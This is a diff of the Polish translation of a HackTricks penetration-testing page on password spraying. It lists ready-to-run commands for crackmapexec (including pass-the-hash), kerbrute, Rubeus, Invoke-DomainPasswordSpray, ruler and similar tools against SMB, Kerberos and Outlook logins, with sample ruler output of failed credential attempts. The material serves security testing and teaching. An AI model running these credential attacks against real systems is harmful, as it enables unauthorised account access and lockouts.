@@ -1,4 +1,4 @@
-# Sianie hasła / Brute Force
+# Sprejowanie hasła / Brute Force
 
 <details>
 
@@ -10,13 +10,13 @@ Inne sposoby wsparcia HackTricks:
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.
 
 </details>
 
-## **Sianie hasła**
+## **Sprejowanie hasła**
 
-Gdy już znajdziesz kilka **poprawnych nazw użytkowników**, możesz spróbować najbardziej **popularnych haseł** (pamiętaj o polityce haseł w środowisku) z każdym z odkrytych użytkowników.\
+Gdy znajdziesz kilka **poprawnych nazw użytkowników**, możesz spróbować najczęstszych **haseł** (pamiętaj o polityce haseł w środowisku) z każdym z odkrytych użytkowników.\
 Domyślnie **minimalna** **długość hasła** wynosi **7**.
 
 Listy powszechnych nazw użytkowników mogą być również przydatne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
@@ -25,7 +25,7 @@ Zauważ, że **możesz zablokować niektóre konta, jeśli spróbujesz kilka raz
 
 ### Pobierz politykę hasła
 
-Jeśli masz jakieś dane uwierzytelniające użytkownika lub dostęp do powłoki jako użytkownik domeny, możesz **uzyskać politykę hasła za pomocą**:
+Jeśli masz pewne dane uwierzytelniające użytkownika lub dostęp do powłoki jako użytkownik domeny, możesz **uzyskać politykę hasła za pomocą**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -62,14 +62,14 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-* Korzystając z [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIEZALECANE, CZASAMI NIE DZIAŁA
+* Korzystając z [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIEZALECANE, CZĘSTO NIE DZIAŁA
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
 * Za pomocą modułu `scanner/smb/smb_login` w **Metasploit**:
 
-![](<../../.gitbook/assets/image (742).png>)
+![](<../../.gitbook/assets/image (745).png>)
 
 * Korzystając z **rpcclient**:
 ```bash
@@ -88,7 +88,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-* Za pomocą [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Domyślnie może generować użytkowników z domeny i pobierać z niej politykę hasła, ograniczając liczbę prób zgodnie z nią):
+* Za pomocą [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Domyślnie może generować użytkowników z domeny i pobierać politykę hasła z domeny, ograniczając liczbę prób zgodnie z nią):
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
@@ -104,17 +104,17 @@ legba kerberos --target 127.0.0.1 --username admin --password wordlists/password
 ```
 {% endcode %}
 
-## Dostęp do Outlook Web Access
+## Outlook Web Access
 
-Istnieje wiele narzędzi do **sprayingu haseł w Outlooku**.
+Istnieje wiele narzędzi do **sprayingu hasła w Outlooku**.
 
-* Za pomocą [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)
-* Za pomocą [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
-* Za pomocą [Ruler](https://github.com/sensepost/ruler) (niezawodne!)
-* Za pomocą [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
-* Za pomocą [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
+* Z [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)
+* z [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
+* Z [Ruler](https://github.com/sensepost/ruler) (niezawodne!)
+* Z [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
+* Z [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-Aby skorzystać z któregokolwiek z tych narzędzi, potrzebujesz listy użytkowników oraz hasła / małej listy haseł do rozpryskiwania.
+Aby skorzystać z któregokolwiek z tych narzędzi, potrzebujesz listy użytkowników oraz hasła / małej listy haseł do sprayowania.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -147,7 +147,7 @@ Aby skorzystać z któregokolwiek z tych narzędzi, potrzebujesz listy użytkown
 Inne sposoby wsparcia HackTricks:
 
 * Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
+* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
